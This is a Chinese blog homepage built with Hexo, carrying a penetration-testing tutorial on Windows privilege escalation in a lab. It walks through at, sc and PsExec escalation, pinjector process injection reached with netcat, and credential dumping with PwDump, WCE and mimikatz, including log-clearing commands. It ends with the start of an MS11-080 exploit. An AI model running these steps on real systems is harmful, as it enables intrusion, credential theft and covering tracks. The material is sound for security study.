<!DOCTYPE html>



  


<html class="theme-next pisces use-motion" lang="zh-Hans">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT" />










<meta name="description" content="欢迎来到Shu1L的神秘小屋！">
<meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="https://shu1l.github.io/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="欢迎来到Shu1L的神秘小屋！">
<meta property="article:author" content="Shu1L">
<meta name="twitter:card" content="summary">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Pisces',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="https://shu1l.github.io/"/>





  <title>Hexo</title>
  








<meta name="generator" content="Hexo 4.2.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Hexo</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about/%20" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
            
            关于
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
            
            归档
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://shu1l.github.io/2020/04/03/shen-tou-ce-shi-bei-dong-xin-xi-shou-ji-1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Shu1L">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/04/03/shen-tou-ce-shi-bei-dong-xin-xi-shou-ji-1/" itemprop="url">渗透测试——被动信息收集</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-03T19:58:56+08:00">
                2020-04-03
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            
          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://shu1l.github.io/2020/04/03/shen-tou-ce-shi-ti-quan/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Shu1L">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/04/03/shen-tou-ce-shi-ti-quan/" itemprop="url">渗透测试——提权</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-03T19:58:36+08:00">
                2020-04-03
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="渗透测试——提权部分知识"><a href="#渗透测试——提权部分知识" class="headerlink" title="渗透测试——提权部分知识"></a>渗透测试——提权部分知识</h2><p>[TOC]</p>
<h3 id="提权——本地提权"><a href="#提权——本地提权" class="headerlink" title="提权——本地提权"></a>提权——本地提权</h3><ul>
<li>已实现本地低权限账号登录<ul>
<li>远程溢出</li>
<li>直接获得账号密码</li>
</ul>
</li>
<li>希望获得更高权限<ul>
<li>实现对目标进一步控制</li>
</ul>
</li>
<li>系统账号之间权限隔离<ul>
<li>操作系统安全的基础</li>
<li>用户空间</li>
<li>内核空间</li>
</ul>
</li>
<li>系统账号<ul>
<li>用户账号登录时获取权限令牌</li>
<li>服务账号无需用户登录已在后台启动服务</li>
</ul>
</li>
<li>Windows<ul>
<li>users</li>
<li>Administrator</li>
<li>System</li>
</ul>
</li>
<li>Linux<ul>
<li>User</li>
<li>Root</li>
</ul>
</li>
</ul>
<h4 id="1-Windows系统提权"><a href="#1-Windows系统提权" class="headerlink" title="1.Windows系统提权"></a>1.Windows系统提权</h4><h5 id="1-使用-at-提权-（当前仅适用于-WinXp-及-Windows-server-2003-等低级版本）"><a href="#1-使用-at-提权-（当前仅适用于-WinXp-及-Windows-server-2003-等低级版本）" class="headerlink" title="1.使用 at 提权 （当前仅适用于 WinXp 及 Windows server 2003 等低级版本）"></a>1.使用 at 提权 （当前仅适用于 WinXp 及 Windows server 2003 等低级版本）</h5><pre><code> # 修改密码：net user kevin *
 C:\Documents and Settings\kevin&gt;net user kevin *
     Type a password for the user:
     Retype the password to confirm:
     The command completed successfully.

 # 查看系统用户：net user
 C:\Documents and Settings\kevin&gt;net user
     User accounts for \\DH-CA8822AB9589
     ---------------------------------------------------------------------
     Administrator            Guest                    HelpAssistant
     IUSR_DH-CA8822AB9589     IWAM_DH-CA8822AB9589     kevin
     SUPPORT_388945a0
     The command completed successfully.

 # 查看用户状态：
 C:\Documents and Settings\kevin&gt;net user kevin
     User name                    kevin
     Full Name                    kevin
     Comment
     User&#39;s comment
     Country code                 000 (System Default)
     Account active               Yes
     Account expires              Never

     Password last set            2/28/2018 2:05 PM
     Password expires             Never
     Password changeable          2/28/2018 2:05 PM
     Password required            Yes
     User may change password     Yes

     Workstations allowed         All
     Logon script
     User profile
     Home directory
     Last logon                   2/28/2018 2:03 PM

     Logon hours allowed          All

     Local Group Memberships      *Administrators       *Users
     Global Group memberships     *None
     The command completed successfully.
</code></pre><p>1.查看用户进程</p>
<p> <img src="https://img-blog.csdn.net/20180228141004062?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvS2V2aW5oYW5zZXI=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"></p>
<p>2.将 kevin 用户权限提升为 system 权限</p>
<pre><code>  C:\Documents and Settings\kevin&gt;cd \
  C:\&gt;at -?
  C:\&gt;at 2:15 /interactive cmd  #必须是未来时间，否则将是明天时间
      Added a new job with job ID = 1
  C:\&gt;at
  Status ID   Day                     Time          Command Line
  ---------------------------------------------------------------------
          1   Today                     2:15 AM       cmd
</code></pre><p><img src="https://img-blog.csdn.net/20180228142729494?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvS2V2aW5oYW5zZXI=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"></p>
<p>3.用新的 system 权限的窗口启动任务管理器</p>
<pre><code>  C:\WINDOWS\system32&gt;taskmgr</code></pre><p>4.关闭explorer</p>
<p><img src="https://img-blog.csdnimg.cn/2019041316500887.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>5.应用程序-&gt;新任务-&gt;explorer</p>
<p><img src="https://img-blog.csdnimg.cn/20190413165013914.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>6.验证桌面用户权限</p>
<p><img src="https://img-blog.csdnimg.cn/20190413165019827.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h5 id="2-使用-sc-提权-适用于-Win7-及Windows-server-2008-等高级版本"><a href="#2-使用-sc-提权-适用于-Win7-及Windows-server-2008-等高级版本" class="headerlink" title="2.使用 sc 提权 (适用于 Win7 及Windows server 2008 等高级版本)"></a>2.使用 sc 提权 (适用于 Win7 及Windows server 2008 等高级版本)</h5><p>1.运行-&gt;services.msc</p>
<p><img src="https://img-blog.csdnimg.cn/2019041316502652.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<ul>
<li>C:\Documents and Settings\kevin&gt;cd</li>
<li>C:&gt;sc Create syscmd binPath= “cmd /K start” type= own type= interact</li>
<li>C:&gt;sc start syscmd</li>
</ul>
<p>3.使用 Sysinternals Suite 套件</p>
<p>推荐书籍 《Windows Internals第7版》</p>
<p><a href="https://download.sysinternals.com/files/SysinternalsSuite.zip" target="_blank" rel="noopener">Sysinternals Suite 套件下载</a></p>
<ul>
<li><p>下载之后解压使用其中的 PsExec 放在C盘根目录</p>
<p><img src="https://img-blog.csdnimg.cn/20190413165034700.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
</li>
<li><p>启动 PsExec.exe</p>
</li>
</ul>
<pre><code>  C:\&gt;PsExec.exe
  -i: 交互模式
  -s: 使用系统账户

  C:\&gt;psexec -p&#39;sei -s -d taskmgr
  C:\&gt;PsExec.exe -i -s cmd</code></pre><ul>
<li>提权结果</li>
</ul>
<p><img src="https://img-blog.csdnimg.cn/20190413165041110.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h4 id="2-注入进程提权"><a href="#2-注入进程提权" class="headerlink" title="2.注入进程提权"></a>2.注入进程提权</h4><ul>
<li>pinjector.exe</li>
</ul>
<p>下载：<a href="https://www.tarasco.org/security/Process_Injector/：" target="_blank" rel="noopener">https://www.tarasco.org/security/Process_Injector/：</a></p>
<ul>
<li>下载之后解压使用其中的 PsExec 放在C盘根目录</li>
</ul>
<p><img src="https://img-blog.csdn.net/20180228204907249?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvS2V2aW5oYW5zZXI=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"></p>
<ul>
<li>列出可注入进程及其信息<ul>
<li>C:&gt;pinjector.exe</li>
<li>C:&gt;pinjector.exe -l</li>
</ul>
</li>
<li>找一个未使用端口<ul>
<li>C:&gt;netstat -nao | find “555” </li>
<li>无结果表示未使用</li>
</ul>
</li>
<li>选择一个进程注入</li>
</ul>
<pre><code>  C:\&gt;pinjector.exe -l
      PID    668 services.exe ( 16 Threads)  USER: \\NT AUTHORITY\SYSTEM
  C:\&gt;pinjector.exe -p 668 cmd 555
      Privilege Switcher for Win32(Private version)
      (c) 2006 Andres Tarasco - atarasco@gmail.com
      [+] Trying to execute cmd to 668 as: ? \
      [+] Code inyected... ; )</code></pre><ul>
<li>查看被注入的进程的监听状态</li>
</ul>
<pre><code>  C:\&gt;netstat -nao | find &quot;555&quot;
      TCP    0.0.0.0:555            0.0.0.0:0              LISTENING       668</code></pre><ul>
<li>查看被注入的进程的监听状态</li>
</ul>
<pre><code>  C:\&gt;netstat -nao | find &quot;555&quot;
      TCP    0.0.0.0:555            0.0.0.0:0              LISTENING       668</code></pre><ul>
<li>利用此监听端口</li>
</ul>
<pre><code>  root@kali：~# nc -nv 10.10.10.128 555
      Connection to 10.10.10.128 555 port [tcp/*] succeeded!
      Microsoft Windows XP [?汾 5.1.2600]
      (C) ??????? 1985-2001 Microsoft Corp
  C:\WINDOWS\system32&gt;whoami
      whoami
      SYSTEM</code></pre><ul>
<li>查看进程</li>
</ul>
<pre><code>  使用 SysinternalsSuite/procexp.exe 查看进程</code></pre><p><img src="https://img-blog.csdn.net/20180228204920586?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvS2V2aW5oYW5zZXI=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"></p>
<h4 id="3-读取windows本地密码"><a href="#3-读取windows本地密码" class="headerlink" title="3.读取windows本地密码"></a>3.读取windows本地密码</h4><h5 id="1-抓包嗅探"><a href="#1-抓包嗅探" class="headerlink" title="1. 抓包嗅探"></a>1. 抓包嗅探</h5><ol>
<li>Windows<ul>
<li>Wireshark</li>
<li>Omnipeek</li>
<li>Commview</li>
<li>Sniffpass：抓取密码相关的数据包</li>
</ul>
</li>
<li>Linux<ul>
<li>Tcpdump</li>
<li>Wireshark</li>
<li>Dsniff：抓取密码相关的数据包</li>
</ul>
</li>
</ol>
<h5 id="2-键盘记录本地密码"><a href="#2-键盘记录本地密码" class="headerlink" title="2. 键盘记录本地密码"></a>2. 键盘记录本地密码</h5><ul>
<li>可以使用木马软件 DarkCometRAT</li>
<li>在控制目标主机之后可以监控键盘记录信息</li>
</ul>
<h5 id="3-查看本地缓存密码"><a href="#3-查看本地缓存密码" class="headerlink" title="3.查看本地缓存密码"></a>3.查看本地缓存密码</h5><ul>
<li>在浏览器查看缓存密码</li>
</ul>
<p><img src="https://img-blog.csdnimg.cn/20190413165110693.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<ul>
<li><p>windows 密码恢复工具</p>
<ul>
<li><a href="http://www.nirsoft.net/password_recovery_tools.html" target="_blank" rel="noopener">Windows Password Recovery Tools</a></li>
</ul>
</li>
<li><p>使用 Pwdump 查看 windows 本地登录密码</p>
<ul>
<li>windows 登录密码保存在 C:\Windows\System32\config\SAM 文件中</li>
<li>pwdump 在 kali 系统中可以找到 /usr/share/windows-binaries/fgdump/</li>
<li>添加用户</li>
</ul>
<pre><code>  C:\Documents and Settings\kevin&gt;net user user2 123456 /add
  C:\Documents and Settings\kevin&gt;net user
      \\ICST-WINATT 的用户帐户
      -------------------------------------------------------------
      Administrator            Guest                    HelpAssistant
      kevin                    SUPPORT_388945a0         test
      user1                    user2
  C:\Documents and Settings\kevin&gt;cd \
  C:\&gt;PwDump.exe localhost
      Administrator:500:18D583B495C4696AFF17365FAF1FFE89:5D36F0CA14EEBEF32F55C7B6A4675DB0:::
      Guest:501:NO PASSWORD*********************:NO PASSWORD*********************:::
      HelpAssistant:1000:5906F3A72959D5902440275BA555A537:10AA20D63C3EC71E0102AC95ADF6DF73:::
      kevin:1004:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4:::
      SUPPORT_388945a0:1002:NO PASSWORD*********************:8AFA81401E8D8EBFA42B4E46F6507C07:::
      test:1005:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4:::
      user1:1006:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4:::
      user2:1007:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4:::Completed.
  # 结果：前部分是 LMHASH ，后部分是 NTLMHASH
</code></pre><ul>
<li><p>可以将结果保存在文件中，然后在 kali 中进行破解</p>
<p><img src="https://img-blog.csdnimg.cn/20190413165117218.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
</li>
</ul>
</li>
</ul>
<h4 id="WCE-WINDOWS-CREDENTIAL-EDITOR"><a href="#WCE-WINDOWS-CREDENTIAL-EDITOR" class="headerlink" title="WCE (WINDOWS CREDENTIAL EDITOR)"></a>WCE (WINDOWS CREDENTIAL EDITOR)</h4><ul>
<li>WINDOWS身份认证过程</li>
</ul>
<p><img src="https://img-blog.csdnimg.cn/20190413165135348.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h5 id="WCE-WINDOWS-CREDENTIAL-EDITOR-1"><a href="#WCE-WINDOWS-CREDENTIAL-EDITOR-1" class="headerlink" title="WCE (WINDOWS CREDENTIAL EDITOR)"></a>WCE (WINDOWS CREDENTIAL EDITOR)</h5><ul>
<li>windows 内核中保存有密码明文副本，安全机制较低</li>
<li>需要管理员权限</li>
<li>工具保持在 kali 的 /usr/share/wce/wce-universal # 通用格式是自动识别32位和64位</li>
<li>多用户登录目标主机</li>
</ul>
<p><img src="https://img-blog.csdnimg.cn/20190413165139664.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<ul>
<li>列举登录账号及会话</li>
</ul>
<pre><code>  C:\&gt;wce-universal.exe -lv
      0020B19D:user1:ICST-WINATT:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4
      001E5D92:user2:ICST-WINATT:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4
      001B9220:test:ICST-WINATT:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4
      0000C7CE:kevin:ICST-WINATT:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4
      000003E4:ICST-WINATT$:MSHOME:AAD3B435B51404EEAAD3B435B51404EE:31D6CFE0D16AE931B73C59D7E0C089C0
      # 与 C:\&gt;PwDump.exe localhost 结果相同</code></pre><ul>
<li><p>每隔5秒刷新一次</p>
<ul>
<li>wce-universal.exe -r</li>
</ul>
</li>
<li><p>删除登录会话</p>
<pre><code>  C:\&gt;wce-universal.exe -d 0020B19D
  C:\&gt;wce-universal.exe -lv
      001E5D92:user2:ICST-WINATT:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4
      001B9220:test:ICST-WINATT:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4
      0000C7CE:kevin:ICST-WINATT:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4
      000003E4:ICST-WINATT$:MSHOME:AAD3B435B51404EEAAD3B435B51404EE:31D6CFE0D16AE931B73C59D7E0C089C0
</code></pre></li>
<li><p>计算密码对应的 HASH 值</p>
</li>
</ul>
<pre><code>  C:\&gt;wce-universal.exe -g passwd
      Password:   passwd
      Hashes:     91C7AE7122196B5EAAD3B435B51404EE:22315D6ED1A7D5F8A7C98C40E9FA2DEC</code></pre><ul>
<li>读取内核中的明文密码</li>
</ul>
<pre><code>  C:\&gt;wce-universal.exe -w
      user1\ICST-WINATT:123456
      user2\ICST-WINATT:123456
      test\ICST-WINATT:123456
      kevin\ICST-WINATT:123456
      NETWORK SERVICE\MSHOME:

  C:\&gt;net user user1 111222
      命令成功完成。
  C:\&gt;wce-universal.exe -w
      user1\ICST-WINATT:123456
      user2\ICST-WINATT:123456
      test\ICST-WINATT:123456
      kevin\ICST-WINATT:123456
      NETWORK SERVICE\MSHOME:
  # 当前内核中保存的值会在下次登录被读取出来</code></pre><ul>
<li>对 LUID 进行修改（将LUID改为匹配其他用户的用户名和密码）</li>
</ul>
<pre><code>  C:\&gt;wce-universal.exe -lv
      001E5D92:user2:ICST-WINATT:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4
      001B9220:test:ICST-WINATT:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4
      0000C7CE:kevin:ICST-WINATT:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4
      000003E4:ICST-WINATT$:MSHOME:AAD3B435B51404EEAAD3B435B51404EE:31D6CFE0D16AE931B73C59D7E0C089C0
  C:\&gt;wce-universal.exe -i 001E5D92 -s kevin:ICST-    WINATT:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4
      Changing NTLM credentials of logon session 001E5D92h to:
      Username: kevin
      domain: ICST-WINATT
      LMHash: 44EFCE164AB921CAAAD3B435B51404EE
      NTHash: 32ED87BDB5FDC5E9CBA88547376818D4
      NTLM credentials successfully changed!
  C:\&gt;wce-universal.exe -lv
      001E5D92:kevin:ICST-WINATT:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4
      001B9220:test:ICST-WINATT:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4
      000003E4:ICST-WINATT$:MSHOME:AAD3B435B51404EEAAD3B435B51404EE:31D6CFE0D16AE931B73C59D7E0C089C0</code></pre><ul>
<li><p>Win7 及 之前默认 都可遭受 WCE 攻击</p>
<ul>
<li>防范方法：修改注册表</li>
</ul>
<pre><code>  HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages</code></pre><ul>
<li>删除 wdigest 之后重启计算机</li>
</ul>
<p><img src="https://img-blog.csdnimg.cn/20190413165146599.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
</li>
</ul>
<h5 id="fgdump"><a href="#fgdump" class="headerlink" title="fgdump"></a>fgdump</h5><ul>
<li>PwDump localhost<ul>
<li>位置：Pwdump 在 kali 系统中可以找到 /usr/share/windows-binaries/fgdump/</li>
</ul>
</li>
<li>fgdump<ul>
<li>位置：Pwdump 在 kali 系统中可以找到 /usr/share/windows-binaries/fgdump/<br>放在 WinXP 中， 双击或在命令行执行 fgdump.exe 会自动生成三个文件，文件中保存着密码</li>
</ul>
</li>
</ul>
<p><img src="https://img-blog.csdnimg.cn/20190413165151759.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h5 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h5><ul>
<li>在 kali 中的路径 /usr/share/mimikatz，将 win32 复制到 windows 主机</li>
</ul>
<pre><code>  C:\Win32&gt;mimikatz.exe
  查看帮助是：：
  mimikatz # ::
              standard  -  Standard module  [Basic commands (does not require module name)]
                crypto  -  Crypto Module
              sekurlsa  -  SekurLSA module  [Some commands to enumerate credentials...]
              kerberos  -  Kerberos package module  []
             privilege  -  Privilege module
               process  -  Process module
               service  -  Service module
               lsadump  -  LsaDump module
                    ts  -  Terminal Server module
                 event  -  Event module
                  misc  -  Miscellaneous module
                 token  -  Token manipulation module
                 vault  -  Windows Vault/Credential module
           minesweeper  -  MineSweeper module
                   net  -
                 dpapi  -  DPAPI Module (by API or RAW access)  [Data Protection application programming interface]
             busylight  -  BusyLight Module
                sysenv  -  System Environment Value module
                   sid  -  Security Identifiers module
                   iis  -  IIS XML Config module
                   rpc  -  RPC control of mimikatz            
  mimikatz # privilege::
              Module :        privilege
              Full name :     Privilege module

                 debug  -  Ask debug privilege            * *
                driver  -  Ask load driver privilege
              security  -  Ask security privilege
                   tcb  -  Ask tcb privilege
                backup  -  Ask backup privilege
               restore  -  Ask restore privilege
                sysenv  -  Ask system environment privilege
                    id  -  Ask a privilege by its id
                  name  -  Ask a privilege by its name
  mimikatz # privilege::debug
  mimikatz # sekurlsa::
  mimikatz # sekurlsa::logonPasswords
  mimikatz # sekurlsa::wdigest
  mimikatz # process::list
  mimikatz # lsadump::sam
  mimikatz # lsadump::cache
  mimikatz # ts::multirdp
  mimikatz # event::clear
  mimikatz # event::drop
  mimikatz # misc::regedit
  mimikatz # token::whoami</code></pre><h3 id="提权——利用漏洞提权"><a href="#提权——利用漏洞提权" class="headerlink" title="提权——利用漏洞提权"></a>提权——利用漏洞提权</h3><h5 id="1-使用-Ms011-080-获取-WinXP-的-SYSTEM-权限"><a href="#1-使用-Ms011-080-获取-WinXP-的-SYSTEM-权限" class="headerlink" title="1. 使用 Ms011-080 获取 WinXP 的 SYSTEM 权限"></a>1. 使用 Ms011-080 获取 WinXP 的 SYSTEM 权限</h5><ul>
<li><p>Ms011-080 对应补丁 Kb2592799</p>
<p><a href="https://technet.microsoft.com/library/security/ms11-080" target="_blank" rel="noopener">微软官网公告(https://technet.microsoft.com/library/security/ms11-080)</a></p>
<p><img src="https://img-blog.csdnimg.cn/20190413165237322.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
</li>
</ul>
<pre><code> root@kali:~# searchsploit Ms11-080
     ------------------------------------------ --------------------------------
      Exploit Title                            |  Path
                                               | (/usr/share/exploitdb/)
     ------------------------------------------ --------------------------------
     Microsoft Windows - &#39;AfdJoinLeaf&#39; Local P | exploits/windows/local/21844.rb
     Microsoft Windows XP/2003 - &#39;afd.sys&#39; Loc | exploits/windows/local/18176.py
     ------------------------------------------ --------------------------------

 root@kali:~# cp /usr/share/exploitdb/exploits/windows/local/18176.py .

 # 将文件拷贝到 英文版 WinXP 系统(有时候中文版 XP 也可以使用)
 # 首先查看 WinXP 是否安装了 对应更新 Kb2592799
